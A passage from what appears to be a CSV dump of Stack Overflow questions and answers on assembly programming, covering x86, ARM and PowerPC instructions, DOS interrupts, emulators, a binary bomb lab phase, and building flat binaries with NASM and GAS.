test2.o:     file format elf32-powerpc

Disassembly of section .text:

00000000 &lt;.text&gt;:
   0:   38 60 00 00     li      r3,0
   4:   38 80 00 01     li      r4,1
   8:   38 a0 ff ff     li      r5,-1
   c:   38 c0 7f ff     li      r6,32767
  10:   3c e0 00 00     lis     r7,0
  14:   60 e7 80 00     ori     r7,r7,32768
  18:   39 00 80 01     li      r8,-32767
  1c:   39 20 80 00     li      r9,-32768
  20:   3d 40 ff ff     lis     r10,-1
  24:   61 4a 7f ff     ori     r10,r10,32767
  28:   3d 60 00 00     lis     r11,0
  2c:   61 6b fc 10     ori     r11,r11,64528
$ 
</code></pre>
","11147432"
"x86 Can push/pop be less than 4 bytes?","6941","","<p>Hi I am reading a guide on x86 by the University of Virginia and it states that pushing and popping the stack either removes or adds a 4-byte data element to the stack. </p>

<p>Why is this set to 4 bytes? Can this be changed, could you save memory on the stack by pushing on smaller data elements?</p>

<p>The guide can be found here if anyone wishes to view it:
<a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"">http://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a></p>
","<p>Short answer: Yes, 16 or 32 bits. And, for <a href=""http://en.wikipedia.org/wiki/X86-64"">x86-64</a>, 64 bits.</p>

<p>The primary reasons for a stack are to return from nested function calls and to save/restore register values. It is also typically used to pass parameters and return function results. Except for the smallest parameters, these items usually have the same size by the design of the processor, namely, the size of the instruction pointer register. For 8088/8086, it is 16-bits. For 80386 and successors, it is 32-bits. Therefore, there is little value in having stack instructions that operate on other sizes. </p>

<p>There is also the consideration of the size of the data on the memory bus. It takes the same amount of time to retrieve or store a word as it does a byte. (Except for 8088 which has 16-bit registers but an 8-bit data bus.) Alignment also comes into play. The stack should be aligned on word boundaries so each value can be retrieved as one memory operation. The trade-off is usually taken to save time over saving memory. To pass one byte as a parameter, one word is usually used. (Or, depending on the optimization available to the compiler, one word-sized register would be used, avoiding the stack altogether.)</p>
","15855444"
"Divide overflow in Assembly language","6936","","<p>I have a simple assembly program, where I want to divide two numbers (two byte sized) and print remainder. Here's my code </p>

<pre><code>  .model small
.stack 256

.data 
    ten dw 10

.code
main proc
    mov ax, @data
    mov ds, ax

    mov ax, 12 ; divident
    div ten    ; ax/10

    mov ah, 9  ; for printing dx
    int 21h

    mov ax, 4c00h ; ending program
    int 21h
main endp
end main
</code></pre>

<p>So when I run this code the result is ""Divide overflow"" and I have no idea why does overflow happens. 
Any ideas?</p>
","<p><code>DIV mem16</code> divides <code>DX:AX</code> by the given operand. So you need to sign-extend <code>AX</code> into <code>DX</code>, which you easily can do with the <code>CWD</code> instruction prior to the division (in your case <code>MOV DX,0</code> or <code>XOR DX,DX</code> would also work). I.e.:</p>

<pre><code>mov ax,12
cwd
div ten
</code></pre>

<p>Another problem with your code is that you seem to assume that <code>int 21h / ah=9</code> can be used to print numeric values. That is not the case. If you want to print the value of <code>DX</code> (i.e. the remainder) you'll have to convert it into a string first and print that string. Otherwise you'll just get garbage output, and your program might even crash.</p>
","15850478"
"8086/88 emulator for ubuntu","6931","","<p>I need to emulate assembly for 8086 program in Ubuntu.</p>

<p>I searched repository and I found 8085 emulator which is not similar to 8086.</p>

<p>Is there any 8086/88 assembly emulator for ubuntu?</p>
","<p>I suggest looking at</p>

<p><strong>Edit</strong> Found:</p>

<ul>
<li><p>bcc</p>

<blockquote>
  <p>This is a C-compiler for 8086 cpus which is important for the
  development of boot loaders or BIOS related 8086 code.</p>
  
  <p><strong>It is possible to run 8086 code under i386 Linux using an emulator,
  `elksemu', also included in this package.</strong></p>
</blockquote></li>
<li><p>dosbox (runs old-style .com files just fine)</p>

<blockquote>
  <p>DOSBox is a x86 emulator with Tandy/Hercules/CGA/EGA/VGA/SVGA graphics,
  sound and DOS. It's been designed to run old DOS games under platforms that
  don't support it. (Win2k/XP/FreeBSD/Linux/MAC OS X)</p>
</blockquote></li>
<li><p>dosemu</p>

<blockquote>
  <p>DOSEMU is a PC Emulator application that allows Linux to run a DOS
  operating system in a virtual x86 machine. This allows you to run
  many DOS applications.</p>
  
  <ul>
  <li>Color text and full keyboard emulation (via hotkeys) via terminal.</li>
  <li>Built-in X support, includes IBM character set font.</li>
  <li>Graphics capability at the console with most compatible video cards.</li>
  <li>DPMI support so you can run DOOM.</li>
  <li>CDROM support.</li>
  <li>Builtin IPX and pktdrvr support.</li>
  </ul>
</blockquote></li>
<li><p>bochs</p>

<blockquote>
  <p>Bochs is a highly portable free IA-32 (x86) PC emulator written in C++, that
  runs on most popular platforms. It includes emulation of the Intel x86 CPU,
  common I/O devices, and a custom BIOS.</p>
</blockquote></li>
<li><p>qemu/kvm</p>

<blockquote>
  <p>Using KVM, one can run multiple virtual PCs, each running unmodified Linux or
  Windows images. Each virtual machine has private virtualized hardware: a
  network card, disk, graphics adapter, etc.</p>
  
  <p>KVM (for Kernel-based Virtual Machine) is a full virtualization solution for
  Linux hosts on x86 (32 and 64-bit) hardware.</p>
</blockquote></li>
</ul>
","8555143"
"Assembly - bubble sort for sorting string","6924","","<p>I am writing a program in assembly using tasm. My task is to write a program that will use bubble sort to sort entered string alphabetically. Ex. if you enter ""hello"" it should write ""ehllo"". I have writened the begging to enter string and to sort it (I think it works okey until the end where it should print out the result, but at the end it just writes my .data once and the finisheds its work) P.S sorry for bad english     </p>

<pre><code>.model small
.stack 100h

.data
request     db 'This program is using bubblesort to get alphabetical order of your enterd string', 0Dh, 0Ah, 'Enter your string:', 0Dh, 0Ah, '$'
result      db 0Dh, 0Ah, 'Result:', 0Dh, 0Ah, '$'
buffer      db 100, ?, 100 dup (0)

.code

start:
MOV ax, @data                   
MOV ds, ax                      


MOV ah, 09h
MOV dx, offset request
int 21h


MOV dx, offset buffer           
MOV ah, 0Ah                     
INT 21h                         


MOV si, offset buffer           
INC si                          
MOV bh, [si]                    
INC si                          

sort:
mov cx, [si] 
mov bx, [si]     

nextelement:
mov ax, [bx+si]     
cmp ax, [bx+si+1]   
jge noswap          
xchg ax, [bx+si+1]
mov ax, [bx+si]

noswap:
inc si              
cmp cx, si          
jl nextelement      
loop nextelement 



MOV ah, 09h
MOV dx, offset result
int 21h


char:
LODSB                           
MOV ah, 2                       
MOV dl, al                      
INT 21h                        

DEC bh                          
JZ ending                       
JMP char                        


ending:
MOV ax, 4c00h               
INT 21h                         

end start
</code></pre>
","<p>1) For bubble sort you need two nested loops. The outer loop resets the start parameters for the inner loop until there is nothing left to swap.</p>

<p>2) You sort <strong>characters</strong>. That are 8-bit values (bytes). You can't load them directly into a 16-bit register (<code>mov ax, [bx+si]</code>).</p>

<p>3) <code>[bx+si]</code> &amp; <code>[bx+si+1]</code>: this is so wrong that I cannot explain the error :-) .</p>

<p>Instead of correcting your code I wrote an example ""from scratch"": following the illustration in <a href=""http://en.wikipedia.org/wiki/Bubble_sort"" rel=""nofollow noreferrer"">http://en.wikipedia.org/wiki/Bubble_sort</a>:</p>

<p><img src=""https://i.stack.imgur.com/QsPAZ.gif"" alt=""Bubble sort animation""></p>

<pre><code>.MODEL small
.STACK 1000h                        ; Don't skimp with stack!

.DATA
    Struct0A EQU $                  ; Buffer for INT 21h/0Ah (max,got,buf)
        max db 100                  ; Maximum characters buffer can hold (incl. CR (0Dh))
        got db 0                    ; Number of characters actually read, (excl. CR (0Dh))
        buf db 100 dup (0)          ; Actual characters read, including the final carriage return (0Dh)
    Linefeed db 13, 10, '$'
    GetString   db 'Enter string: $'

.CODE
start:
    mov ax, @DATA                           ; Initialize DS
    mov ds, ax

    ; Input String
    mov ah, 09h
    mov dx, OFFSET GetString
    int 21h
    mov dx, OFFSET Struct0A
    mov ah, 0Ah
    INT 21h

    mov si, OFFSET buf                      ; Base for [si + bx] 
    xor bx, bx                              ; Prepare BX for following byte load
    mov bl, got                             ; Load length of string = 0Dh at the end
    mov BYTE PTR [si + bx], '$'             ; Delimiter for int 21h / 09h

    outer:
    dec bx                                  ; The last character is already at the right place
    jz done                                 ; No characters left = done
    mov cx, bx                              ; CX: loop variable
    mov si, OFFSET buf
    xor dl, dl                              ; DL (hasSwapped) = false

    inner:
    mov ax, [si]                            ; Load **two** characters
    cmp al, ah                              ; AL: 1. char, AH: 2. char
    jbe S1                                  ; AL &lt;= AH - no change
    mov dl, 1                               ; hasSwapped = true
    xchg al, ah                             ; Swap characters
    mov [si], ax                            ; Store swapped characters
    S1:
    inc si                                  ; Next pair of characters
    loop inner

    test dl, dl                             ; hasSwapped == true?
    jnz outer                               ; yes: once more
    done:

    ; Print result
    mov dx, OFFSET Linefeed
    mov ah, 09h
    int 21h
    mov dx, OFFSET buf
    mov ah, 09h
    int 21h

    mov ax, 4C00h
    int 21h

END start
</code></pre>

<p>And here is another ""animated"" illustration:</p>

<p><a href=""https://www.youtube.com/watch?v=lyZQPjUT5B4"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=lyZQPjUT5B4</a></p>
","26324630"
"What is the minimum instruction set required for any Assembly language to be considered useful?","6906","","<p>I am studying Assembly programming in general, so I've decided to try and implement a ""virtual microprocessor"" in software, which has registers, flags and RAM to work with, implemented with variables and arrays. But since I want to simulate <strong>only the most basic behavior of any microprocessor</strong>, I want to create an assembly language that has only the essential instructions, only those instructions without which it couldn't be useful. I mean, there are assembly languages that can do multiplication and swapping register values, etc, but these operations are not basic because you can implement them using simpler instructions. I don't want to implement instructions like those.</p>

<p>I can imagine a couple of instructions which (I believe) must always be present in any assembly language, such as <em>MOV</em> to move bytes around and <em>JP</em> to send the instruction pointer to another address.</p>

<p>Could you suggest a set of the most basic and essential assembly instructions? Thanks!</p>
","<p>Well, this is a very broad subject. I suppose you need to get familiar with <a href=""http://en.wikipedia.org/wiki/Random_access_machine"">Random Access Machine</a>. I'm not an expert, but it's difficult to tell which instructions should be supported by this very basic microprocessor. For example: Subtraction and multiplication may be simulated by Addition operation. Multiplication is possible if microprocessor supports jumps and conditional instructions and subtraction is possible by adding negative number. </p>
","9439034"
"ARM LDR instruction on PC register","6894","","<p>Here how I understand the story:</p>

<ul>
<li>PC register holds pointer to next instruction</li>
<li>LDR instruction is loading the value of second operand into first operand
(for example) <pre>LDR r0, [pc, 0x5678]</pre>
is equivalent to this ""C code"" <pre>
r0 = *(pc + 0x5678)
</pre>
It's pointer dereferencing with base offset.</li>
</ul>

<p>And my question:</p>

<p>I found this code </p>

<pre>
LDR PC, [PC,-4]
</pre>

<p>It's commented like monkey patching, etc..</p>

<p>How I understand this code</p>

<pre>pc = *(pc - 4)</pre>

<p>I this case ""pc"" register will dereference the address of previous instruction and will contain the ""machine code"" of instruction (not the address of instruction),
and program will jump to that invalid address to continue execution, and probably we will get ""Segmentation Fault"".
So what I'm missing or not understanding?</p>

<p><br><br>The thing that makes me to think is the brackets of second operand in LDR instruction.
As I know on x86 architecture brackets are already dereferencing the pointer, but I can't understand the meaning in ARM architecture.</p>

<pre>
mov r1, 0x5678
add r1, pc
mov r0, [r1]
</pre>

<p>is this code equivalent to?</p>

<pre>
LDR r0, [pc, 0x5678]
</pre>
","<p>Quoting from section 4.9.4 of the <em>ARM Instruction Set</em> document (ARM DDI 0029E):</p>

<blockquote>
  <p>When using <code>R15</code> as the base register you must remember it contains an address 8 bytes on
  from the address of the current instruction.</p>
</blockquote>

<p>So that instruction will load the word located 4 bytes <em>after</em> the current instruction, which hopefully contains a valid address.</p>
","24116090"
"How does one change an instruction with a hex editor?","6893","","<p>I am messing around with some reverse engineering, but I don't know how to change a jnz to jz with a hex editor. I understand it will vary between systems but I'm not sure where to look to find this information. I'm working on Mac OS X 64 bit and I disassembled code with IDA Pro.</p>
","<p>If you've found a <code>jz</code>, it will either look like <code>74 XX</code> or <code>0F 84 XX XX XX XX</code>. If it's a <code>74</code>, change it to <code>75</code>. If it's the one with <code>84</code>, change it to <code>85</code>. This information can be found, among other places, in Intel's manual (volume 2A).</p>

<p>It will not vary between systems, as long as they're all x86 based, and if they aren't then <code>jz</code> and <code>jnz</code> may not even exist..</p>
","12039556"
"Storing and incrementing integer variables in MASM x86 assembly","6891","","<p>I'm trying to understand assembly. Today's topic is: ""Storing and incrementing int variables and printing numbers"" :)</p>

<p>So here's my code</p>

<pre><code>dane segment
     count     db     0
dane ends

code segment
start:
     inc     byte ptr ds:[count]
     inc     byte ptr ds:[count]
     inc     byte ptr ds:[count]

     mov     dl,ds:[count]
     mov     ah,2
     int     21h

     mov     ah,4ch
     int        21h
code ends
end start
</code></pre>

<p>When I compile and run, I got this error:</p>

<p><img src=""https://i.stack.imgur.com/wuWig.png"" alt=""enter image description here""></p>

<p>It only happens when <code>count</code> is incremented more than once.
What wrong am I doing?</p>

<p>Can somebody explain why I can't simply write:</p>

<pre><code>inc     count
</code></pre>

<p>Also, why I have to put <code>byte ptr</code> when incrementing values, but not if I copy it to <code>dl</code> register?</p>
","<p><strong>Edit:</strong> rewrote and added text, added code (works in MASM 6.11):</p>

<p>In x86 assembbly you need to specify the size of the memory operand for instructions in which there would be ambiguity otherwise. You have to tell the assembler the size of the operand with <code>byte ptr</code>, <code>word ptr</code> etc. For that reason <code>inc byte ptr ds:[count]</code> needs <code>byte ptr</code>. <code>inc word ptr ds:[count</code> is different instruction.</p>

<p><code>mov dl,ds:[count]</code> do not need <code>byte ptr</code>, because <code>dl</code> is a 8-bit register and therefore the size of the memory operand is always the same, a byte (8 bits).</p>

<p>To print characters, you need to first convert the number into a string (or a single character for numbers less than 10). Otherwise you are printing control character ETX (see <a href=""http://www.asciitable.com/"" rel=""nofollow noreferrer"">ASCII table</a>) that has ASCII code 3. For numbers less than 10, printing in decimal is trivial, just add '0' (<code>30h</code>), like this:</p>

<pre>
mov     dl,ds:[count]
add     dl,'0'        ; add dl,30h
</pre>

<p>Printing in decimal in x86 assembly is a asked quite often, see for example <a href=""https://stackoverflow.com/questions/9975848/is-this-code-correct-number-plus-number-then-print-the-result"">Is this code correct (Number plus number, then print the result)</a> to get the idea.</p>

<p><strong>Edit:</strong> EXE files need also a stack segment.</p>

<p>DOS EXE files need to have a stack segment. Assembling with MASM 6.11 does not give any warnings or errors, basically with <code>dosexe.asm</code> (replace dosexe.asm to your assembly code file name).</p>

<p>But linking with ML (<code>ml dosexe.obj</code>) gives the following warning:</p>

<pre>
LINK : warning L4021: no stack segment
</pre>

<p>So, a stack segment needs to be added, add the following lines to top of the source.</p>

<pre>
.model small
.stack 4096
</pre>

<p>There was also some problem with data segment definition, I fixed that too.</p>

<p>The entire fixed assembly code could be something like this (works in MASM 6.11):</p>

<pre>
.model small
.stack 4096

.data
        count     db 0

.code
start:
        mov     ax,seg count
        mov     ds,ax

        inc     byte ptr ds:[count]
        inc     byte ptr ds:[count]
        inc     byte ptr ds:[count]

; this code does the printing in decimal without needing to reverse
; the string, by dividing the divisor. 100/10 = 10

        mov     bl,100     ; original divisor.

        mov     al,ds:[count]

print_loop:
        xor     ah,ah ; clear top 8 bits of the dividend (in ax).
        div     bl    ; divide ax by bl. quotient in al, remainder in ah.

        mov     dl,al     ; the value to be printed with ah = 2, int 21h

        mov     al,ah     ; remainder gets divided in the next loop.
        test    dl,dl     ; check if number is zero
        jz      not_print ; don't print leading zeros.

        add     dl,'0'    ; convert to ASCII numeric characters range.
                          ; '0' = 0x30 = 48
        push    ax
        mov     ah,2
        int     21h       ; print the value, according to Ralf Brown's
        pop     ax        ; interrupt list returns al.

not_print:
        push    ax
        mov     al,bl
        xor     ah,ah
        mov     bl,10     ; divide the divisor by 10.
        div     bl
        mov     bl,al     ; the new divisor.
        pop     ax
        test    bl,bl
        jnz     print_loop

        mov     ah,4ch
        int     21h
end start
</pre>
","15585436"
"Creating Nested If-Statements in ARM Assembly","6883","","<p>I am interested in converting a Fibonacci sequence code in C++ into ARM assembly language. The code in C++ is as follows: </p>

<pre><code>#include &lt;iostream&gt; 
using namespace std; 
int main()
{
    int range, first = 0 , second = 1, fibonacci; 
    cout &lt;&lt; ""Enter range for the Fibonacci Sequence"" &lt;&lt; endl; 
    cin &gt;&gt; range; 

    for (int i = 0; i &lt; range; i++)
    {
        if (i &lt;=1) 
            {
                fibonacci = i; 
            }
        else 
            {
                fibonacci = first and second; 
                first = second; 
                second = fibonacci; 
            }
    }
cout &lt;&lt; fibonacci &lt;&lt; endl; 

return 0; 
}
</code></pre>

<p>My attempt at converting this to assembly is as follows: </p>

<pre><code>    ldr r0, =0x00000000 ;loads 0 in r0
    ldr r1, =0x00000001 ;loads 1 into r1
    ldr r2, =0x00000002 ;loads 2 into r2, this will be the equivalent of 'n' in C++ code, 
                         but I will force the value of 'n' when writing this code 
    ldr r3, =0x00000000 ;r3 will be used as a counter in the loop 

    ;r4 will be used as 'fibonacci'

loop:
    cmp r3, #2 ;Compares r3 with a value of 0
    it lt 
    movlt r4, r3 ;If r3 is less than #0, r4 will equal r3. This means r4 will only ever be
                  0 or 1. 

    it eq ;If r3 is equal to 2, run through these instructions
    addeq r4, r0, r1
    moveq r0,r1
    mov r1, r4
    adds r3, r3, #1 ;Increases the counter by one 

    it gt ;Similarly, if r3 is greater than 2, run though these instructions
    addgt r4, r0, r1
    movgt r0, r1
    mov r1, r4
    adds r3, r3, #1
</code></pre>

<p>I'm not entirely sure if that is how you do if statements in Assembly, but that will be a secondary concern for me at this point. What I am more interested in, is how I can incorporate an if statement in order to test for the initial condition where the 'counter' is compared to the 'range'. If counter &lt; range, then it should go into the main body of the code where the fibonacci statement will be iterated. It will then continue to loop until counter = range. </p>

<p>I am not sure how to do the following: </p>

<pre><code>cmp r3, r2 
;If r3 &lt; r2
    {
        &lt;code&gt;
    }

;else, stop
</code></pre>

<p>Also, in order for this to loop correctly, am I able to add: </p>

<pre><code>cmp r3, r2
bne loop
</code></pre>

<p>So that the loop iterates until r3 = r2? </p>

<p>Thanks in advance :)</p>
","<p>It's not wise to put if-statements inside a loop. Get rid of it.</p>

<p>An optimized(kinda) standalone Fibonacci function should be like this:</p>

<pre><code>unsigned int fib(unsigned int n)
{
  unsigned int first = 0;
  unsigned int second = 1;
  unsigned int temp;

  if (n &gt; 47) return 0xffffffff; // overflow check
  if (n &lt; 2) return n;

  n -= 1;

  while (1)
  {
    n -= 1;
    if (n == 0) return second;
    temp = first + second;
    first = second;
    second = temp
  }
}
</code></pre>

<p>Much like factorial, optimizing Fibonacci sequence is somewhat nonsense in real world computing, because they exceed the 32-bit barrier really soon: It's 12 with factorial and 47 with Fibonacci.</p>

<p>If you really need them, you are served the best with very short lookup tables.</p>

<p>If you need this function fully implemented for larger values:
<a href=""https://www.nayuki.io/page/fast-fibonacci-algorithms"" rel=""nofollow"">https://www.nayuki.io/page/fast-fibonacci-algorithms</a></p>

<p>Last but not least, here is the function above in assembly:</p>

<pre><code>cmp r0, #47     // r0 is n
movhi   r0, #-1     // overflow check
bxhi    lr
cmp r0, #2
bxlo    lr

sub r2, r0, #1  // r2 is the counter now
mov r1, #0      // r1 is first
mov r0, #1      // r0 is second

loop:
subs    r2, r2, #1  // n -= 1   
add r12, r0, r1 // temp = first + second
mov r1, r0      // first = second
bxeq    lr      // return second when condition is met
mov r0, r12     // second = temp
b   loop
</code></pre>

<p>Please note that the last <code>bxeq lr</code> can be placed immediately after <code>subs</code> which might seem more logical, but with the multiple issuing capability of the Cortex series in mind, it's better in this order.</p>

<p>It might be not exactly the answer you were looking for, but keep this in mind: A single if statement inside a loop can seriously cripple the performance - a nested one even more.</p>

<p>And there are almost always ways avoiding these. You just have to look for them.</p>
","20027836"
"Assembly fast division by 2","6881","","<p>Is there a faster way of dividing by 2, with sign, in assembly than the one in the example below?</p>

<pre><code>...
mov ecx, 2
idiv ecx
push eax #push the result
...
</code></pre>
","<p>Sure:</p>

<pre><code>sar eax, 1
</code></pre>

<p>The <code>sar</code> opcode differs from <code>shr</code> in that the most significant (sign) bit is preserved in <code>sar</code>, and it is set to 0 in <code>shr</code>. The <a href=""http://en.wikipedia.org/wiki/Arithmetic_shift"" rel=""noreferrer"">Arithmetic shift</a> page on Wikipedia shows much more detail about this operation in a general context.</p>

<p>Note that on a 2's complement machine (which the x86 is) this actually calculates <code>floor(eax / 2)</code>. In particular, that means that for an integer <em>x</em>:</p>

<ul>
<li>for <em>x = 0</em>, the result is 0</li>
<li>for <em>x > 0</em>, the result is <em>floor(x / 2)</em></li>
<li>for <em>x &lt; 0</em>, the result is also <em>floor(x / 2)</em>, or <em>-ceil(-x / 2)</em></li>
</ul>

<p>The latter result gives results that may be unexpected. For example, -3 sar 1 results in -2, not -1. On the other hand, 3 sar 1 results in 1.</p>
","2036680"
"Binary Bomb Phase 5 issue (my phase 5 seems to be different from everyone elses)","6881","","<p>So I am working on a Binary Bomb assignment and have gotten stuck. Tried looking at other questions and guides but mine seems to be completely different from what is described in other questions and guides I found on the web. </p>

<p>The phase only takes 2 unsigned ints for input. Here it is disassembled in gdb after being run with 11 2 as input.</p>

<pre><code>Dump of assembler code for function phase_5:
0x08048ccc &lt;+0&gt;:     push   %ebp
0x08048ccd &lt;+1&gt;:     mov    %esp,%ebp
0x08048ccf &lt;+3&gt;:     push   %esi
0x08048cd0 &lt;+4&gt;:     push   %ebx
=&gt; 0x08048cd1 &lt;+5&gt;:     sub    $0x20,%esp
0x08048cd4 &lt;+8&gt;:     lea    -0x10(%ebp),%eax
0x08048cd7 &lt;+11&gt;:    mov    %eax,0xc(%esp)
0x08048cdb &lt;+15&gt;:    lea    -0xc(%ebp),%eax
0x08048cde &lt;+18&gt;:    mov    %eax,0x8(%esp)
0x08048ce2 &lt;+22&gt;:    movl   $0x8049b0a,0x4(%esp)
0x08048cea &lt;+30&gt;:    mov    0x8(%ebp),%eax
0x08048ced &lt;+33&gt;:    mov    %eax,(%esp)
0x08048cf0 &lt;+36&gt;:    call   0x8048788 &lt;__isoc99_sscanf@plt&gt;
0x08048cf5 &lt;+41&gt;:    cmp    $0x1,%eax
0x08048cf8 &lt;+44&gt;:    jg     0x8048cff &lt;phase_5+51&gt;
0x08048cfa &lt;+46&gt;:    call   0x80492b6 &lt;explode_bomb&gt;
0x08048cff &lt;+51&gt;:    mov    -0xc(%ebp),%eax
0x08048d02 &lt;+54&gt;:    and    $0xf,%eax
0x08048d05 &lt;+57&gt;:    mov    %eax,-0xc(%ebp)
0x08048d08 &lt;+60&gt;:    cmp    $0xf,%eax
0x08048d0b &lt;+63&gt;:    je     0x8048d36 &lt;phase_5+106&gt;
0x08048d0d &lt;+65&gt;:    mov    $0x0,%ecx
0x08048d12 &lt;+70&gt;:    mov    $0x0,%edx
0x08048d17 &lt;+75&gt;:    mov    $0x8049960,%ebx
0x08048d1c &lt;+80&gt;:    add    $0x1,%edx
0x08048d1f &lt;+83&gt;:    mov    (%ebx,%eax,4),%eax
0x08048d22 &lt;+86&gt;:    add    %eax,%ecx
0x08048d24 &lt;+88&gt;:    cmp    $0xf,%eax
0x08048d27 &lt;+91&gt;:    jne    0x8048d1c &lt;phase_5+80&gt;
0x08048d29 &lt;+93&gt;:    mov    %eax,-0xc(%ebp)
0x08048d2c &lt;+96&gt;:    cmp    $0xb,%edx
0x08048d2f &lt;+99&gt;:    jne    0x8048d36 &lt;phase_5+106&gt;
0x08048d31 &lt;+101&gt;:   cmp    -0x10(%ebp),%ecx
0x08048d34 &lt;+104&gt;:   je     0x8048d3b &lt;phase_5+111&gt;
0x08048d36 &lt;+106&gt;:   call   0x80492b6 &lt;explode_bomb&gt;
0x08048d3b &lt;+111&gt;:   add    $0x20,%esp
0x08048d3e &lt;+114&gt;:   pop    %ebx
0x08048d3f &lt;+115&gt;:   pop    %esi
0x08048d40 &lt;+116&gt;:   pop    %ebp
0x08048d41 &lt;+117&gt;:   ret
</code></pre>

<p>For the line  0x08048d17 &lt;+75>:    mov    $0x8049960,%ebx</p>

<p>I used </p>

<p>x/16b 0x8049960</p>

<p>gdb and it tells me </p>

<p>0x8049960 array.2954: 10      0       0       0       2       0       0      0</p>

<p>0x8049968 array.2954+8:       14      0       0       0       7       0      00</p>

<p>When I go through the program using until until I get to </p>

<p>0x08048d31 &lt;+101>:   cmp    -0x10(%ebp),%ecx</p>

<p>%edx = 11, %ecx = 82, and %ebp-0x10 = 2 (used print to get values for first two and x/d $ebp-0x10 for last one)</p>

<p>Because 82 != 2 it just goes to call explode_bomb.</p>

<p>From what I understand it is reading in my 2 numbers, making sure I entered 2 at &lt;+41>.
Then it grabs the first number from the array which in this case is 10 and puts it into $eax at +=&lt;+51>. Then it puts eax into -0xc($ebp) at &lt;+57>.</p>

<p>Then it checks to make sure $eax isn't 15 at &lt;+60>, goes on to set $ecx, and $edx to 0. It then passes the pointer to the array to $ebx at &lt;+75>.</p>

<p>Then it enters a loop from &lt;+80> to &lt;+91> but I am not sure what it is really doing. I get that it increments $edx by 1 and the loop is exited when $eax is 15, but I cant figure out how the rest of the stuff works out. </p>

<p>Am I understanding it correctly up to the loop part? And, if someone wouldn't mind explaining what is happening between &lt;+80> and &lt;+91> I would be very grateful. </p>

<p>p.s. Sorry if my formatting is wrong. </p>
","<blockquote>
  <p>Then it grabs the first number from the array which in this case is
  10 and puts it into $eax at +=&lt;+51>.</p>
</blockquote>

<p>Wrong. <code>&lt;+51&gt;</code> reads the first number you entered, not the first number from the array. It's then masked into the 0..15 range by discarding the top bits, and is written back to the local variable where it came from. It also lives on in <code>eax</code>, of course.</p>

<p>The array contains 4 byte integers and there are 15 of them. As such you can print it using <code>x/15wd</code>.</p>

<p>Now to the loop. <code>edx</code> is obviously just keeping track of the iteration count, no surprise there. <code>&lt;+83&gt;</code> is the interesting part: it replaces <code>eax</code> with the value of the array item whose index <code>eax</code> currently holds. That is <code>eax = array[eax]</code>. <code>ecx</code> is of course just summing up the array elements you have visited, that's again easy. The exit condition is when you hit the array item that has value 15.</p>

<p>What it all boils down is that this array is really a linked list. The end of the list is marked by a 15. The first number you enter is used as a starting point for list traversal. It should be selected such that you have 11 elements until the end of the list (see <code>&lt;+96&gt;</code>). The second input number should equal the sum of the array items visited.</p>
","23400601"
"How to generate plain binaries like nasm -f bin with the GNU GAS assembler?","6881","","<p>I have some NASM files that generally have the structure:</p>

<pre><code>        [BITS 64]
        [ORG 0x0000000000200000]

start:
        ...

        ret
</code></pre>

<p>I'm assembling them like so:</p>

<pre><code>nasm -f bin abc.asm
</code></pre>

<p>I'd like to write some of these using GAS instead. Two questions:</p>

<ul>
<li><p>What directives should I use in GAS? I've found the '.org' directive but GAS doesn't seem to have a '.bits' directive.</p></li>
<li><p>What should I pass to <code>gcc</code> or <code>as</code> to generate a plain binary file? I.e. what the <code>-f bin</code> option does with NASM.</p></li>
</ul>
","<blockquote>
  <p>What directives should I use in GAS? I've found the '.org' directive but GAS doesn't seem to have a '.bits' directive.</p>
</blockquote>

<p>The assembler defaults to 64--bit for me, you can use <code>--32</code> or <code>--64</code> to chose on the command line. Have a look at the manual for <a href=""http://sourceware.org/binutils/docs-2.17/as/index.html"">as</a> to see how you can change the architecture inside the code if needed (e.g. <code>.code16</code> can be used to generate real mode code for a boot loader).</p>

<p>You most likely don't want to use the <code>.org</code> directive to specify where the code is located, but will probably want to use a link script or specify where the text and data segments are loaded on the command line. (<code>org 0x0000000000200000</code> results in a 2+ MB binary file).</p>

<blockquote>
  <p>What should I pass to gcc or as to generate a plain binary file? I.e. what the -f bin option does with NASM.</p>
</blockquote>

<pre><code>$ cat test.S
.section .text
.globl _start
_start:
        xor %rax, %rax
        mov test, %rax
        ret

test: .quad 0x1234567812345678


$ as --64 -o test.o test.S
$ ld -Ttext 200000 --oformat binary -o test.bin test.o
</code></pre>

<p><code><pre>
$ objdump -D -b binary -m i386:x86-64 test.bin
test.bin:     file format binary
Disassembly of section .data:</p>

<p>0000000000000000 &lt;.data>:
   0:   48 31 c0                xor    %rax,%rax
   3:   48 8b 04 25 0c 00 20    mov    0x20000c,%rax
   a:   00 
   b:   c3                      retq<br>
   c:   78 56                   js     0x64
   e:   34 12                   xor    $0x12,%al
  10:   78 56                   js     0x68
  12:   34 12                   xor    $0x12,%al
</pre></code></p>
","6829145"
"Factorial in Assembly Language","6878","","<p>I want to find a factorial of a number which is less than 8 using this code. but this is not working can anyone help me out?
This was my home work. i tried but it is printing same character again and agian..</p>

<pre><code>.model small_  
.stack_

.data_  
no db 1h_ ;  
counter db 1_  
string1 db ""Please Enter the No. to calculate factorial (0~8): "",""$""  
string2 db ""Factorial is: "",""$""  

.code  
main proc  
mov ax,@data  
mov ds,ax  
mov dx,offset string1  
mov ah,09h  
int 21h  
mov cl,1  
loop1:  
cmp counter,3  
ja End1  
mov ah,01h  
int 21h  
sub al,48  
inc counter  
mov no,al  
cmp no,8  
ja loop1  

Factorial:  
cmp no,cl  
je display  
mul al,cl  
inc cl  
jmp factorial  

Display:  
mov ax,@data  
mov ds,ax  
mov dx,offset string2  
mov ah,09  
int 21h  
mov dl,al  
add dl,48  
mov ah,02h  
int 21h  
End1:  
mov ah,4ch  
int  21h  
main endp  
**_End main _**
</code></pre>
","<p>You have at least three major problems in your code:</p>

<ul>
<li><code>8!</code> is too large to fit into <code>AL</code>. </li>
<li>Your printing code only works for numbers up to <code>9</code>. You're adding 48 and then printing as a character, which is fine for single-digit, but even for <code>10</code> it can't work. You need to write a complete section for printing numbers (or maybe use one that your professor provided)?</li>
<li>You are storing the result of your computation in <code>AL</code>, but you overwrite it when you do <code>mov ax, @Data</code>.</li>
</ul>
","19122488"
"NASM on Virtual Machine Ubuntu: Cannot execute binary file exec format error","6871","","<p>I am getting an error after assembling a simple 64 bit hello world program.
I am using the following commands:</p>

<pre><code>nasm -f elf64 hello.asm -o hello.o    successfull
ld -o hello.o hello -m elf_x86_64     successfull
./hello
</code></pre>

<p>error: Cannot execute binary file exec format error</p>

<p>I am executing this in a 64 bit Ubuntu Virtual Machine.
I appreciate your help! </p>
","<p>The error:</p>

<blockquote>
